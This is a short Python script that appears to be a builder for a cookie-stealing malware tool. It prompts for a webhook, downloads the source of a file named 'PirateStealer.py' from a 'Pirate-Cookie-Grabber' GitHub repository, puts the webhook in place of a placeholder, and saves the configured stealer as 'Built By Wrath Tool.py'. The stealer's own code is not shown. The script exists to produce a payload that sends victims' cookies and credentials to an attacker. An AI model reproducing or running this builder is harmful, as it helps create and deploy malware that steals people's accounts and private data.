import requests
from requests import get
import os
def main():

    webhook = input('Enter webhook: ')
    r = requests.get('https://raw.githubusercontent.com/Mani175/Pirate-Cookie-Grabber/main/PirateStealer.py').text
    r = r.replace('heh', webhook)

    with open('Built By Wrath Tool.py', 'w') as f:
        f.write(r)


 